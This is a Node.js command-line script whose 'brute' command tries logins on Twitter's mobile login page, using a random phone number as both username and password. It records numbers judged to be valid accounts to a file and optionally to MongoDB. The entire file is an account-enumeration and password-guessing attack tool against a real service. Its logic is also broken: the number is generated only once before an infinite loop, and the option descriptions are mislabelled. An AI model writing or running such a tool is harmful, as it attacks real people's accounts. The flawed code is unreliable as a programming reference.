const program = require('commander');
const addNumber = require('./database');
const osmosis = require('osmosis');
const chalk = require('chalk');
const fs = require('fs');
const pjson = require('../package.json');

const log = console.log;

program
    .version(pjson.version) // Tool version
    .description(pjson.description); // Tool description

program
    .command('brute')
    .option('-c , --countrycode [value]', 'output file')
    .option('-l , --length [value]', 'output file')
    .option('-o , --output [value]', 'output file')
    .option('-d , --db', 'push to database')
    .alias('b') //A shortcut for brute command
    .description('brute using random numbers and add to database.') // Brute description.
    .action(async (options) => {
        let download_file = options.output;
        let phoneNumber = 0 + Math.random().toString().slice(2, options.length); // Generate random phone number by length
        // Infinite Asynchronous loop
        for (let i = 0; ; i++) {
            // Check phoneNumber is not false.
            if (!isNaN(phoneNumber)) {
                //Call tryLogin function asynchronously
                await tryLogin(options.countrycode, phoneNumber).then(async result => {
                    // If number is exist
                    if (result.indexOf('error?username_or_email') === -1) {
                        // Print the vaild number result.
                        log('#' + i + ' ' + chalk.magenta(phoneNumber + ' ' + chalk.greenBright('Correct')));
                        await fs.appendFileSync(download_file, phoneNumber + "\r\n"); // Save the result in the download file
                        if (options.db === 'db')
                            await addNumber(phoneNumber); // Add phone number to MongoDB
                    } else
                        // Print the incorrect number result.
                        log('#' + i + ' ' + chalk.magenta(phoneNumber + ' ' + chalk.yellow('Error'))); //error if not is not exist
                }).catch((err) => {
                    // Print the error.
                    log(err);
                });
            } else
                // Print the following in case of incorrect number.
                log('#' + i + ' ' + chalk.magenta('Number' + i + chalk.red('Incorrect number.')));
        }
    });

program.parse(process.argv);

/**
 * @param {number} cCode Country Code
 * @param {number} number Phone Number 
 */
function tryLogin(cCode, number) {
    return new Promise((resolve, reject) => {
        let url = 'm.twitter.com/login?lang=en' // Twitter login page in english
        osmosis
            .get(url) // Open login form.
            .login(cCode + number, number) // Input username, password.
            .then((context) => resolve(context.__location.url.href)) // Resolve the result.
            // .log(log)
            .error(reject); // In case of error use reject.
        // .debug(log);
    });
}